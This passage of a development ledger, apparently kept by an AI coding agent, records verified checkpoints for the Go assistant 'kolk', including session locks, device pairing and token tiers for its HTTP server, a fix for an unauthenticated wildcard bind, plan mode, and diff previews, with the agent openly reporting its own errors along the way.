- [x] every `kolk help` command compared against the capability catalog.
- [x] the one genuine gap closed and ratcheted so it cannot return.
- [x] full `make check` green: 2,022 tests, 0 lint issues, site 138 checks.

### Plan and ledger audit, 2026-08-27 — recorded detail

A read-only pass over PLAN.md and CHECKPOINTS.md looking for claims that had drifted from the tree.
Six things were out of place; none was a false completion claim, which is the finding that would have
mattered most.

**Every Go file the ledger names exists**, except three — `internal/dash/handler.go`, `ingest.go` and
`query.go` — and all three sit inside boxes that were never ticked. Nothing claims work that is not
there.

**Two of the six were mine, from inserting new material without reading around it.** Section E (Reach)
went in before "## C. Data", so the plan read A, B, E, C, D. Phase I went in before Phase H for the
same reason. Both moved.

**Item 24 was `[ ]` while carrying a linked doc and shipped work.** The legend at the top of the plan
says `[~]` is in progress and `[x]` is hardened with a doc, and item 24's own Anthropic row is `[~]`
with two named checkpoints. Corrected to `[~]`.

**A12 promised a store the plan had already refused.** Its headline still read "SQLite ingest and
measured size/startup budget changes" while its own child A12.2 recorded the measurement that killed
SQLite — 578 ms for a heavy user's year from `stats.jsonl`, against a third module the budget gate
hard-fails on. A12.3 and A12.4 described the same dead shape and are now marked superseded with the
same reason, keeping the parts that survive: live bus ingest is still unbuilt and still wanted, and
whether `/v1/stats/*` belongs on `kolk serve` is a question for item 26.

**A12.1 was done and unticked.** `internal/dash/dist/index.html` and `internal/dash/embed.go` both
exist. An unticked box that is actually finished is the cheaper of the two errors, but it still makes
the ledger lie about how much is left.

Not changed, and worth naming rather than quietly fixing: **every hardened item's "Today:" line is
stale.** Item 11 still says "single-line stdin REPL" beneath a Hardened line describing 3,600 lines of
TUI. They read as a snapshot from when the item was written and the Hardened line supersedes them, so
rewriting twenty of them would be churn — but a new reader will trip over it.

Acceptance checklist:

- [x] every Go path named in a ticked leaf exists.
- [x] the three missing paths sit in unticked boxes, not completed ones.
- [x] section and phase ordering corrected.
- [x] item states match the legend the plan defines.
- [x] leaves describing refused work are marked superseded, not left open.
- [x] full `make check` green after the edits.

### I27.2 the session overview — verified detail

`session.List` loads every message of every session. For `kolk sessions` that is fine; for a list a
dashboard polls it is the wrong shape, and measuring it said so: 27 ms and 3.3 MB of garbage per call
across the 549 sessions on this machine, none of which a card displays.

`Card` is deliberately not a `*Session`. Its decode struct has no `Messages` field, so
`encoding/json` walks the transcript and allocates none of it — and a type that cannot carry a
transcript cannot accidentally leak one into a view.

**Then the benchmark caught me making it twenty times worse.** The first version called `lock.Try`
per session for liveness, and `Try` opens, chmods, writes a PID and closes. Across 549 sessions that
turned a 27 ms listing into **553 ms** — and, because `Try` creates the file it locks, it left **549
stray lock files in the real sessions directory**, which I ran it against. I deleted them; no session
data was touched, only the `.lock` files created seconds earlier.

That is the second time today measurement changed a decision rather than confirming one, and the
first time it caught damage rather than slowness.

`lock.Held` is the fix: open without `O_CREATE`, probe, release. A missing file means nobody has ever
held it, which is the common case and now costs one failed `open`. Existence alone is not the answer —
the file outlives the lock, so a session that ran and exited leaves one behind — but it is the cheap
first filter. The result is 26.5 ms, *faster than `List` while doing more*, 45% less garbage, and
nothing created.

**A session mid-write looks exactly like a corrupt one** for a few milliseconds, so an unparseable
file is skipped rather than failing the listing: a dashboard that blanks during a save is worse than
one that shows a session late.

Verified in an isolated export of HEAD plus these files, because another agent is editing this
working tree concurrently and its in-progress TUI changes fail a test here. Confirmed the failure is
theirs by testing HEAD alone, then HEAD plus only these files: 2,010 tests, 0 lint issues, every
script contract.

Acceptance checklist:

- [x] a card carries id, title, model, cwd, updated and state, and cannot carry messages.
- [x] the listing is newest first and says which sessions are running.
- [x] corrupt files, non-JSON files and directories are skipped without failing the list.
- [x] a missing directory is empty, not an error.
- [x] an untitled session still has a usable name.
- [x] probing liveness creates no file and steals no lock.
- [x] measured: 26.5 ms and 1.8 MB against 549 real sessions, versus 32.6 ms and 3.3 MB for List.
- [x] full `make check` green in an isolated export: 2,010 tests, 0 lint issues.

### I27.1 a session says it is running — verified detail

Reordered deliberately, and worth saying why: I went to build I26.7, the remote client, and found it
had nothing to show. `kolk serve` creates its own bus with a fresh session id and no spill path, so
it is a standalone event server for a session that does not exist. A remote page built on it would
have rendered an empty screen and looked finished.

The missing piece is item 27's discovery question, so that came first. My own hardening doc had the
leaf order wrong; the doc is now amended rather than quietly worked around.

**Liveness is a lock, not a flag.** The interesting case is the one nobody writes code for: a session
whose process was killed. A flag in a file needs someone to clear it, and the process that would have
is the one that died. The OS drops an advisory lock when the process goes, so a crashed session stops
looking live without anything noticing it crashed. `internal/lock` already existed with PID recording
and nothing was using it for this.

**Asking does not steal it.** `Live` takes the lock and immediately gives it back, because a dashboard
that polls would otherwise lock out the session it is describing. A test starts a session *after*
inspecting it twice, which is the assertion that matters.

**Unknown is a state.** `lock_windows.go` and `lock_other.go` both return `ErrUnsupported`, so on those
platforms liveness genuinely cannot be observed. Reporting `unknown` is better than reporting `idle`
for every session on Windows — a dashboard that quietly lies is worse than one that admits a gap. The
tests skip there rather than asserting a behaviour that cannot exist, and they detect that by probing
rather than by listing platforms.

**Holding is not fatal.** A platform without file locks still runs sessions; it just cannot say which
are running. The REPL takes the lock if it can and carries on if it cannot, and releases it before
closing the backend so a failure there still frees the session for the next process.

Acceptance checklist:

- [x] an unheld session is idle; a held one is live; a released one is idle again.
- [x] inspecting liveness does not prevent the session from starting.
- [x] two holders of one session are refused.
- [x] the lock file is 0600 and its directory is created.
- [x] unsupported platforms report unknown, and the tests skip there.
- [x] a real session holds its lock for the life of the process.
- [x] full `make check` green: 1,999 tests, 0 lint issues, every script contract.

### I26.6 read and steer tiers — verified detail

Two kinds of caller now reach the server, and they are not equal.

**The operator's `--token` is not tier-limited.** It is the secret the person running the server chose
for themselves; tiering it would be Kolkrabbi restricting its own operator. A device token carries
the tier it was paired at, and pairing always issues read.

**Watching and acting are separated by route.** `/v1/events` answers any authenticated caller;
`/v1/permissions/resolve` needs steer. The refusal says what to do about it — pair again, or promote
the device from the machine running the session — because "forbidden" alone reads as a bug.

**`steerRoutes` is named and ratcheted**, like `openRoutes` before it. Adding a write endpoint without
listing it there would leave it answerable by any paired device, and that failure is silent: nothing
breaks, the endpoint simply works for someone it should not. The test fails instead.

**No token at all still means no tiers.** That path is only reachable on loopback, because I26.1
refuses to serve anything else without one, so it is the local case — and a local session must not
have to pair with itself.

**A revoked device stops working immediately** on its next request, and using a device records
last-seen through the HTTP path, not just the store's own tests.

Two defects found while building this, neither of them the feature:

**My test helper hung the suite.** `as()` issued a GET to `/v1/events`, which is a stream that never
ends, so `make check` sat there until it was killed. The request now carries an already-cancelled
context. Authentication happens before the handler either way, so a refusal is still observed exactly
— the fix costs the test nothing.

**`devices.Store` had a data race, and it was mine.** Every request authenticates, and authenticating
writes a last-seen time, so two devices talking at once is the normal case for a server rather than
an edge one. `Add`, `Revoke`, `List` and `Authenticate` all touched the slice unguarded. Proved with
a sixteen-way race test before fixing it, which is the same shape as the `Recorder` contract F14.5
turned up — concurrency arriving at a type written when nothing was concurrent.

Acceptance checklist:

- [x] a read device can watch and cannot act.
- [x] a steer device can do both; the operator token is unrestricted.
- [x] a revoked device stops working; an unknown token is 403 and a missing one 401.
- [x] using a device over HTTP records last-seen.
- [x] the steer-route set is exactly one, and adding to it fails a test.
- [x] a loopback server with no token refuses nobody.
- [x] `go test ./... -race` clean, including a sixteen-way concurrent store test.
- [x] full `make check` green: 1,992 tests, 0 lint issues, every script contract.

### I26.5 reachability — verified detail

The common failure with a bound port is not insecurity but confusion: someone binds every interface,
sets a token, and still cannot work out which URL to open on their phone. `kolk serve` now answers
that at startup.

**The decision is a pure function over a struct, not over `net.Interface`.** Reachability is exactly
the kind of thing that is only ever wrong on somebody else's laptop, so `Describe` takes a slice of a
plain `Interface` type and every case — Tailscale, LAN, wildcard, IPv6, link-local noise — is a
fixture. `LocalInterfaces` is the thin wrapper that touches the machine, and it is the only part with
nothing asserted about it.

**Tailscale is recognised two ways.** By the `100.64.0.0/10` range it assigns from, and by interface
name — because the interface is not always `tailscale0`: it is `utun` on macOS and `ts0` on some
setups. Either alone would miss real machines. Its address is printed first and marked, because it is
the one that works from anywhere.

**A specific bind advertises only itself.** Binding `192.168.1.5` and then listing the Tailscale
address would send someone to a port that will not answer.

**Link-local addresses are left out.** `169.254.x` and `fe80::` are not somewhere anyone types into a
phone, and a list of six URLs where two work is worse than a list of one.

**A wildcard bind with no usable address still says something**, because printing nothing after
binding a port reads as a crash.

**SSH is offered, not implemented.** `ssh -L <port>:127.0.0.1:<port> <host>` is the honest remote
answer for a loopback bind and needs nothing from Kolkrabbi — which is the same reasoning that keeps
a relay out of this item entirely.

One papercut fixed while here, visible only by running the binary: `--pair` on a loopback bind told
the user to pair a device against a port only that machine can reach. The failure would have looked
like a broken pairing code rather than a binding choice. It now says so, and points at the tunnel.

Acceptance checklist:

- [x] loopback says only this machine can reach it, and offers the tunnel.
- [x] a Tailscale address is found by range and by interface name, and comes first.
- [x] a plain LAN bind warns in words that the network can reach it.
- [x] binding one address advertises only that address.
- [x] link-local addresses are excluded; IPv6 hosts are bracketed.
- [x] a wildcard bind with no addresses still prints a note.
- [x] pairing on an unreachable bind says how the device gets there.
- [x] verified by running the binary, not only by test.
- [x] full `make check` green: 1,983 tests, 0 lint issues, every script contract.

### I26.4 pairing — verified detail

The state machine first, then the route, because the security properties are all in the former and
the latter is plumbing.

**The cap is what makes six digits safe, not the length.** Five guesses at one of a million, inside a
two-minute window a person is watching, is a worse bet than any other way in. Without the cap the
code would have to be long enough to resist guessing, and a code that long is one nobody types. The
cap and the window are load-bearing together; either alone is weak.

**Success disarms; a typo does not.** A code that keeps working is a shared secret with a short name,
so one redemption closes the window. But a wrong code only counts against the cap — costing someone
their pairing session over a mistyped digit would teach them to leave pairing armed, which is the
thing this design exists to avoid. Re-arming resets the count, or one burst of guesses would lock
pairing out until the session restarted.

**Only one racer pairs.** Two phones scanning at once must not both get in; the redemption is under
one lock and a test runs eight goroutines at it.

**The route answers 404 when unarmed, not 401.** A 401 confirms the endpoint exists and is worth
coming back to. An unarmed machine should not advertise that pairing is something it does. The same
applies to an expired or exhausted window — both collapse to "there is nothing here".

**It is routed before auth rather than exempted inside it.** Adding `/v1/pair` to `openRoutes` would
have been the obvious move and would have widened the set I26.2 just ratcheted to exactly two. It is
not open: it exists only while armed. Routing it ahead of the middleware says that in code, and the
ratchet stays intact.

**A new device is always read tier.** Promotion is a decision made at the machine running the
session, never something a device can ask for over the network. The wrong-code response also does not
say how many attempts remain — a counter is a hint about how hard to keep trying.

Wired into `kolk serve --pair` rather than left as a seam nobody calls: it loads the device file,
arms a window at startup, and prints the code, the expiry and the exact request to make.

Acceptance checklist:

- [x] nothing pairs until someone arms it; the code is six digits.
- [x] the right code pairs once and only once.
- [x] wrong codes leave it armed until the cap, then close it for good.
- [x] the window expires; re-arming replaces the code and resets the count.
- [x] exactly one of eight concurrent redemptions wins.
- [x] the route 404s unarmed, expired and exhausted; 403s on a wrong code.
- [x] a paired device is persisted and survives a restart.
- [x] only POST pairs, and a non-JSON body is refused.
- [x] `go test -race -count=5` clean on the state machine.
- [x] full `make check` green: 1,970 tests, 0 lint issues, every script contract.

### I26.3 the device store — verified detail

The storage pairing needs, built before pairing so that the security properties are settled while
they are still cheap to change.

**One token per device, not one per machine.** A shared secret means losing a phone costs everyone
else their access, and in practice means nobody revokes anything. Each device gets its own token, a
label, and a last-seen time; revoking one leaves the rest working, and a test holds that.

**The token is never stored — only its hash.** The store hands a token back exactly once, at pairing,
and keeps a SHA-256 of it. A device that loses its token pairs again; a device file that leaks hands
over nothing. This costs one hash and is the difference between a stolen file being an inconvenience
and being a compromise. The test reads the file back and asserts the token does not appear in it.

**Last-seen is recorded on every authentication**, because "which of these is still in use" is the
question someone asks before revoking, and a list that cannot answer it invites revoking the wrong
device. The clock is injectable so the test asserts on it without sleeping.

**Comparison is constant time**, even though it compares hashes rather than secrets. Iterating a set
of devices with a variable-time compare is still an oracle, and the constant-time version costs
nothing.

The file lives in Data rather than Config, at 0600, for the reason `CredentialsFile` already
documents: it grants access, so it is state, not a setting, and it must not travel with a dotfiles
repository. A missing file is an empty store — no paired devices is the normal starting state — and
a corrupt one names itself rather than sending someone hunting.

The `Tier` type is here rather than in the server because it is a property of the device record, and
the read/steer split is the thing I26.6 will enforce.

Acceptance checklist:

- [x] a paired device's token authenticates as that device.
- [x] the token never appears in the file; the label does.
- [x] two devices get different tokens and neither breaks the other.
- [x] revoking one device leaves the others; revoking twice reports honestly.
- [x] an unknown, empty or wrong-length token is rejected.
- [x] devices survive a reload with their tier intact.
- [x] using a device records when.
- [x] a missing file is empty, a corrupt one names itself, and the file is 0600.
- [x] full `make check` green: 1,952 tests, 0 lint issues, every script contract.

### I26.2 the protected surface, ratcheted — verified detail

Having fixed which addresses may be served, the next question is what is reachable once one is. This
leaf found no defect — which is worth recording, because "I checked and it was already right" is a
different and more useful statement than silence.

The auth middleware wraps the whole mux rather than individual handlers, so **every route is
protected by default** and an unknown path answers 401 rather than 404. That last part matters more
than it looks: a 404 to an unauthenticated caller maps the API surface for whoever is probing it.
A wrong token gets 403 and a missing one 401, which is the right distinction to keep — collapsing
them tells a prober whether the token exists at all.

**The real risk is not a forgotten handler, it is a widened exemption.** Because the middleware
covers everything, the only way to expose an endpoint is to add it to the exempt map — so the test
is on that map, not on the handlers. It was an inline literal inside `Mux`; it is now a named
`openRoutes` with a test asserting it contains exactly `/` and `/v1/health` and nothing else. Adding
a third requires changing the test, which is the point: it forces someone to write down why.

Both open routes are open for the same reason — neither says anything about the session, and a
liveness probe that needs a credential is a liveness probe nothing can use.

Also asserted: a refused response never quotes either the configured token or the one that was
offered. An error message that echoes a credential puts it in logs, terminals and screenshots.

Acceptance checklist:

- [x] every protected route refuses without a token.
- [x] a wrong token is 403, a missing one 401.
- [x] `/` and `/v1/health` stay open.
- [x] an unknown route does not reveal that it is unknown.
- [x] no response quotes a credential.
- [x] the open-route set is exactly two, and widening it fails a test.
- [x] full `make check` green: 1,942 tests, 0 lint issues, every script contract.

### I26.1 the bind floor — verified detail

Phase I opens with a security fix rather than a feature, because everything the phase wants is built
on `kolk serve` and `kolk serve` had a hole.

**`isLoopback("")` returned true, and an empty host means every interface.** `net.SplitHostPort(":8080")`
yields an empty host, the check read that as loopback, and `Mux` therefore served `--addr :8080` with
**no token at all**. On that server sit an SSE stream of the whole session and a permission-resolve
endpoint — so anyone on the same network could watch the work and answer the prompts. Verified by
probe before changing anything, and the same probe now exists as a test.

The rule is now the safe direction of the ambiguity: **anything it cannot prove is loopback is not
loopback.** An empty host, an unparseable address, `0.0.0.0`, `[::]` — all refused without a token.
Guessing "probably local" about an address nobody can parse is the same mistake one step later.

**The second bug was ordering.** `cmd_serve` called `serve.Listen` *before* `serve.New`, so the socket
was opened and only then was the token checked. The deferred close made the window small; it was
still binding before authorising. Reversed: the server is built, and only if that succeeds is the
socket opened.

**Loopback stays frictionless.** A local session must not have to invent a secret to talk to its own
dashboard, and a test holds that line — the fix would be worthless if it made the common case
annoying enough to work around with `--token hunter2`.

The refusal now names the address and says both ways out, because "binding to non-loopback address
requires a non-empty bearer token" reads as a bug in kolk rather than as a decision it made on the
user's behalf.

Acceptance checklist:

- [x] `:8080`, `:0`, `0.0.0.0`, `[::]` and a LAN IP are all not loopback.
- [x] `127.0.0.1`, `localhost`, `[::1]` still are.
- [x] serving a wide-open address without a token is refused, naming the token.
- [x] an unparseable address is refused rather than guessed at.
- [x] loopback and an unset address still need no token.
- [x] a wide-open address with a token is allowed.
- [x] the refusal happens before the socket is opened.
- [x] full `make check` green: 1,936 tests, 0 lint issues, every script contract.

### X3 a long path is elided in the middle, not the end — recorded detail

The second macOS CI failure looked like more of X2 and was not. The assertion saw:

    Writing file — /private/var/folders/…/TestE2E_ToolLoopWithPersistenceAndRewind3553888001/001/hello.tx…

`compactToolText` capped every tool line at 120 runes by keeping the head. For a command that is
right — a command reads left to right, and what it is matters more than its last flag. For a path it
is exactly backwards: the end says which file this is, so cutting there leaves a person approving
"somewhere under /private/var" with the filename the one part they cannot see.

This is a real UX defect, not a test artifact, and it had been shipping since the activity line
existed. Nothing on Linux produced a path long enough to cross 120 characters; a macOS temp directory
does, which is the only reason it surfaced. The same principle already applied elsewhere in this
session — G11.1 truncates a diff in the middle because the last hunk matters as much as the first —
and this line was the place it had not been applied.

Paths now keep 24 characters of head, an ellipsis, and everything else from the tail. Commands are
unchanged.

The test that failed asserted on the whole path, which is what made it platform-dependent for reasons
unrelated to what it was testing. It now asserts the label and the base name.

Acceptance checklist:

- [x] a short path is shown whole.
- [x] a long path keeps its filename and shows the elision.
- [x] a long command still keeps its beginning.
- [x] the argument payload never reaches the line.
- [x] control characters cannot draw on the terminal.
- [x] the end-to-end assertion no longer depends on the length of a temp path.
- [x] full `make check` green: 1,930 tests, 0 lint issues, every script contract.

### X2 the reported path is the resolved path, on every platform — recorded detail

The push went green through `make check` on Linux and failed CI on macOS. Two pre-existing tests
broke — `TestPreWriteHook` and `TestE2E_ToolLoopWithPersistenceAndRewind` — and the cause was mine,
from E13.1.

**macOS `/var` is a symlink to `/private/var`.** Path confinement resolves symlinks before checking
containment, deliberately: a symlink inside the root pointing out of it would otherwise be a hole
straight through the jail. So the path a tool *reports* is the resolved one. On macOS every
`t.TempDir()` sits under that symlink, so any test comparing a tool's path against a raw
`t.TempDir()` compares two spellings of the same file and fails.

**The production behaviour is right and unchanged.** The resolved path is what the confirmation
should name and what the checkpoint should back up: it is the file that is actually written. The
tests were asserting the wrong spelling, so they now resolve their fixture the same way the tool
does, with the reason written down where the next person will read it.

**The correction that matters is the third one.** Two tests passed on Linux and failed on macOS
because nothing on Linux exercised a symlink in the happy path — the existing symlink test covers an
*escape* out of the root, which is the security case, and there was no coverage of a link that stays
inside. `TestTheReportedPathIsTheResolvedOne` builds one explicitly and asserts that both the
confirmation and the pre-write hook name the resolved file. It runs on Linux, so this class of break
is now caught before a push instead of by the one runner that happened to have a symlinked temp
directory.

Worth stating plainly: a green `make check` on one platform is not a green build. CI runs macOS for
exactly this reason, and I pushed without waiting for it.

Acceptance checklist:

- [x] both broken tests resolve their fixture the way the tool does.
- [x] a Linux-runnable test proves the reported path is the resolved one.
- [x] the confirmation and the pre-write hook both see the resolved file.
- [x] the escape case remains covered separately.
- [x] full `make check` green: 1,925 tests, 0 lint issues, every script contract.

### X1 fixtures that do not look like live keys — recorded detail

Pushing 61 commits was refused by GitHub push protection. The two strings it named were fixtures I
wrote during E13.3 — the leaf whose entire purpose is proving that secrets never reach the
conversation. The test suite that exists to stop secrets leaking was the thing blocking the push.

Both were synthetic, and a sweep of the whole unpushed diff for credential shapes found six such
strings, all in the scrubber's corpus, none from the owner's environment: four documentation stubs,
two I had generated.

**The cause was mine and specific.** This repository already had a convention — `sk-or-v1-` followed
by 40 hex characters — used by roughly twenty fixtures that are already on `origin/main` and pass
push protection. I wrote a new one at 64 characters, which is a real OpenRouter key's length, and
that is what a scanner matches on. The Stripe fixture had the same problem: `rk_live_51…` is the
exact shape of a live restricted key.

**The fix is to conform, not to invent.** Both now use the shape the surrounding code already uses,
and each carries a note saying why it is deliberately not the vendor's real length — otherwise the
next person to tidy them makes them realistic again and re-blocks the repository. An assembly helper
that concatenated prefixes at run time would have worked too, and would have been a clever mechanism
where a shorter literal does the job.

Both tests still assert exactly what they did: the scrubber's detection is on the assignment shape
and the value's entropy, neither of which depends on matching a vendor's byte count.

Changing the fixtures did not by itself unblock the push: push protection scans every commit in a
push, and the original strings were still in the commit that introduced them. The owner chose to
rewrite rather than allowlist, which was the cheaper option than it first appeared — `0b7b5326` had
never been pushed, so the rewrite touched only the 62 local commits and nothing anyone had pulled. I
had warned it would rewrite published history; that was wrong, and worth correcting before the
decision rather than after.

The rewrite replaced both strings across the unpushed range with `git filter-branch`, leaving this
commit holding the explanatory notes alone. A backup ref was taken first and kept until the push
succeeded.

Acceptance checklist:

- [x] every credential-shaped string in the unpushed diff was located and identified.
- [x] confirmed none originated from the owner's environment.
- [x] both flagged fixtures conform to the repository's existing fixture shape.
- [x] both tests still assert the value is scrubbed and the assignment survives.
- [x] a note in each file explains the constraint so it is not undone.
- [x] full `make check` green: 1,924 tests, 0 lint issues, every script contract.

### G15.3 plan mode — verified detail

Item 15 called for read-only exploration → plan → approve → execute. E13 turned that from a mechanism
into a mode: `deny write(*)` and `deny bash(*)` as session-scoped rules say the whole thing.

**Built out of the rules, not beside them.** A separate plan-mode flag consulted somewhere in the
guard would be a second permission system with its own precedence, and two permission systems are how
a session ends up refusing something neither of them can explain. Using rules means `/permissions`
shows a plan-mode session exactly what is refusing it, and a test asserts that.

**It refuses even in full-auto**, because it is a rule and rules sit above the tier. That is the same
precedence F14 and E13 already established, applied rather than re-decided.

**Leaving drops what plan mode added and nothing else.** A session rule someone wrote themselves is
not plan mode's to remove, and the test pins the rule count back to what it was before.

**The model is told why.** Refusing the tools silently produces a model that keeps trying them and
reports failures; what is wanted is one that explores and proposes. `ExtraSystem` appends the
instruction and rebuilds the system prompt in place.

That mutation costs the provider's prompt cache, which is exactly why this project injects loop
wakeups as user turns instead. This is the deliberate exception: it happens when a person changes
what the session is *for*, at most twice per plan, and the alternative — putting the posture in a user
message — leaves an instruction in the transcript that compaction may later summarise away. The cost
is recorded on the method rather than discovered later.

**Approving a plan is not a new verb.** The user reads it and runs `/plan off`. An "approve" that
silently re-enabled writing would be the second permission system arriving through a different door.

Acceptance checklist:

- [x] writes and commands are refused in plan mode, even under full-auto.
- [x] reads and listings still work — a mode that cannot read is an off switch.
- [x] leaving restores writing and leaves the user's own session rules alone.
- [x] `/permissions` shows the rules doing the refusing.
- [x] the model is told to plan, and the instruction goes when the mode does.
- [x] entering twice does not stack two sets of rules.
- [x] `go test ./... -race` clean; full `make check` green: 1,924 tests, 0 lint issues.

### G15.2 `/diff` — verified detail

`/changes` listed paths and verbs, which answers "did it touch anything" and not "should I keep
this". Deciding that means reading the change, and until now that meant leaving Kolkrabbi.

Nothing new had to be built to store it. The checkpoint store already keeps the pre-edit contents of
every file the agent's tools touch, and G11.1's `internal/diff` already renders them. This leaf is
those two facts joined, plus one accessor each.

**The baseline is the start of the session, not the previous edit.** `Original` returns the *first*
backup for a path. A file edited three times has one answer to "what has this session done to it";
diffing against the most recent backup would answer "what did the last turn do", which is a different
and much less useful question. The test asserts the intermediate state does not appear at all.

**A file touched and put back says so.** An empty diff printed under a heading reads as a bug, and
"the session edited it and it is back to where it started" is a fact worth knowing when deciding what
to keep.

**A created file is shown as new**, not as a diff against nothing, and a file that has since been
deleted says it is gone rather than printing nothing.

Per-file truncation is 120 lines, cut in the middle like a confirmation is, and a path argument
matches on the tail so `/diff agent.go` works without typing the directory.

Acceptance checklist:

- [x] the diff shows what changed and names the file.
- [x] the baseline is the session's start, with intermediate states absent.
- [x] a created file is marked new and shows its content.
- [x] a path argument narrows to one file and excludes the others.
- [x] a file reverted by hand is reported as unchanged.
- [x] nothing changed says so; an unknown path names itself.
- [x] full `make check` green: 1,918 tests, 0 lint issues, every script contract.

### G15.1 `/undo` — verified detail

`/rewind` restored files and left the conversation, and said so in its own note. That note described
a real divergence rather than a limitation: the model's history still contained the edits, so the
next turn reasoned about a tree that no longer matched what it believed. Nothing surfaces that — the
user cannot see the mismatch and the model cannot detect it.

**Order is the design.** Files are restored first. If they cannot be, the conversation is left exactly
as it was and the error says so: a half-undo that rewinds history while leaving edits in place is the
same divergence in the other direction, and it is the direction that silently loses work.

**A turn starts at what the person said.** Everything after the last user message — replies, tool
calls, their results — exists because of it, so taking the turn back takes all of it. A turn that
changed no files is still a turn.

**One turn per undo.** The store keeps every turn, so walking back further is available; repeated
single undos are easier to reason about than a count nobody can picture, and nobody has asked for the
other thing. Recorded as an open question rather than closed off.

`/rewind` stays for someone who genuinely wants only the files, and its note now points at `/undo`
rather than just stating the limitation.

Acceptance checklist:

- [x] undo takes back both halves and reports each.
- [x] a failed file restore leaves the conversation untouched.
- [x] a turn with no file changes is still undone.
- [x] undoing nothing says so rather than erroring.
- [x] undo without checkpointing refuses, and does not trim history.
- [x] two undos take back two turns, asking the store once each.
- [x] `/undo` is registered for help and completion; `/rewind` points at it.
- [x] full `make check` green: 1,907 tests, 0 lint issues, every script contract.

### G11.3 context and cost in the status line — verified detail

The last leaf of item 11, and the smallest, but it closes the gap between what the engine knows and
what the person can see.

**Nothing was tracking what a session had cost.** The turn footer answers "what did that cost"; the
question that decides whether to keep going is "what has this cost so far", and no code answered it.
`sessionSpend` accumulates in the same place the run meter does, so orchestrated subagents count
toward it — a run's ceiling is per-run, and the session meter is not reset by it.

**Context was measured and unexported.** `contextUsage` fed the footer only, so someone deciding
whether to `/compact` had to run a command to learn whether they needed to. That is the status line
failing at the one thing it is for.

**Empty is not zero.** Before the first turn nothing has been measured, and "context 0%" would be a
measurement nobody made. Both fields are absent until they mean something, which the existing
formatter already handles by skipping empty values.

**They go last** so a narrow terminal clips them before it clips the model or the state — those are
the fields someone cannot recover by running a command.

Noted while here and deliberately not changed: `tui_repl.go` passes lifecycle `"working"` to
`SetStatus` *after* `RunTurn` returns. It reads like a bug and is not one — the runtime calls
`FinishTurn` afterwards and that call decides the lifecycle. Left alone rather than churned; the
`SetStatus` there is what refreshes the two new numbers after every turn, which is why it matters.

Acceptance checklist:

- [x] a fresh session reports no cost.
- [x] the session meter adds up every call, across turns.
- [x] orchestrated subagents count toward the session, not just the run.
- [x] context usage is readable from outside the engine.
- [x] both appear in the status line, and last.
- [x] neither appears before it has been measured.
- [x] both are sanitised like every other status field.
- [x] `go test ./... -race` clean; full `make check` green: 1,901 tests, 0 lint issues.

### G11.2 `@file` mentions — verified detail

**The path reaches the model, not the contents.** Inlining a file at mention time would spend the
window on something the model may not need, and it would race the jail: a path is checked when the
tool runs, and a mention is not a tool call. Naming the file and letting the model read it keeps one
place where confinement is decided.

**`internal/projectfiles` is a new L0 package and never returns an error.** That shapes it: an
unreadable subtree is skipped, the list is capped, and when it cannot tell whether to offer a file it
leaves it out. A completion list is allowed to be incomplete; a session that fails to start because a
directory could not be walked is not.

**The `.gitignore` support is an honest subset** — exact names, directory names, `*.ext`, a leading
`/` to anchor — plus a built-in skip list for the directories that make a completion list useless.
Negations are skipped, which errs toward offering fewer files. Getting a full gitignore
implementation subtly wrong is worse than having an obvious subset, and the doc now says which one
this is rather than claiming the general thing.

**Only the mention being typed completes.** `a@b.com` is an email address; `@model and explain` is
someone who has moved on. Completing either would be the composer rewriting text the person is no
longer editing. My own test asserted mid-line completion should work, which contradicted the rule the
rest of the tests assumed — the test was wrong and now states the real contract, with a second test
pinning that a finished mention is left alone.

The walk runs once at startup. A walk per keystroke would be the completion making the composer feel
slow, which is the opposite of its purpose.

Two `nilerr` findings on the walk callback, both fixed by naming the intent (`skipUnreadable`) rather
than silencing the linter — an `if err != nil { return nil }` really is worth being made to justify.

Acceptance checklist:

- [x] files list as sorted slash paths, `.git` and heavy directories never appear.
- [x] `.gitignore` names, directories and `*.ext` globs are honoured; `/` anchors to the root.
- [x] the list is capped, and an unreadable root yields nothing rather than failing.
- [x] `@` completes; an empty mention offers the project.
- [x] completing rewrites only the mention, leaving the rest of the line alone.
- [x] no mention, an email address, or a finished mention suggests nothing.
- [x] mentions take precedence over command completion in the composer.
- [x] full `make check` green: 1,893 tests, 0 lint issues, every script contract.

### G11.1 diff preview before confirm — verified detail

The gap with the safety edge: E13's tiers assume the person at the prompt knows what they are
agreeing to, and until now they were shown a description rather than the change.

**A create and an overwrite looked identical.** `write_file` previewed the first 400 characters of
the *new* content whether or not a file was already there, so replacing a file was visually the same
as adding one and the thing being destroyed never appeared at all. `edit_file` was better — old block
then new block — but unbounded and unlocated: no context, no line numbers, and a large `old_str`
flooded the prompt.

**`internal/diff` is a new L0 package, stdlib-only.** Common prefix/suffix trim, then LCS over what
is left, with a size guard: beyond four million cells the two texts are reported as a wholesale
replacement, which is both true and instant. This code runs in front of somebody waiting to answer a
prompt, so the property that matters is not speed in the average case but that it always returns.

**Truncation cuts the middle.** The last hunk matters as much as the first, and a preview that always
drops the tail teaches people the tail does not matter — exactly wrong when what they are approving
is a change to their files.

**An empty diff says so.** Writing content a file already has now reads "no change" rather than
presenting an empty prompt, which looks like a bug.

Two things this leaf found that were not in the plan:

**My own tests wrote four files into the repository.** `Options.Root` is a containment boundary, not a
resolution base: a relative path resolves against the process working directory, and Root only
decides whether the result is *reported* as outside. In a real session they are the same directory,
which is why the distinction only surfaces in a test that sets one without the other. The tests now
`t.Chdir`, and the field says what it is.

**Three of my TUI tests were vacuously green.** The overlay flattened the whole detail onto one row —
newlines became spaces — and the row happened to fit in 80 columns, so every `strings.Contains`
assertion passed against precisely the renderer the tests existed to reject. Flattening a diff keeps
every substring and destroys the only thing that made it readable. The assertions now check
structure: the two sides of a change must not share a row. The overlay renders one row per line,
each sanitised and clipped on its own, bounded at 32 rows so it cannot push its own question off
screen.

Acceptance checklist:

- [x] an overwrite shows what it replaces as well as what it writes.
- [x] a create says "new file" and shows no deletions.
- [x] an edit shows a located hunk with surrounding context.
- [x] a huge rewrite is truncated in the middle, both sides surviving.
- [x] writing identical content says nothing changes.
- [x] the overlay renders every diff line as its own row, sanitised individually.
- [x] a long detail is bounded so the question stays on screen.
- [x] `go test ./... -race` clean; full `make check` green: 1,878 tests, 0 lint issues.

### F14.6 the orchestrator slot reaches the orchestrator — verified detail

Found reviewing phase F against its own doc rather than against its leaf list, which is the review
worth doing: every leaf was built as specified and the feature still had a hole.

`runOrchestrated` resolved its model with `a.modelFor(a.Effort)` and handed that to the planner and
to synthesis. F14.3 added the `orchestrator` slot, but it only ever reached tasks the planner
happened to label `design`. So a user who set the slot named for the orchestrator would find it
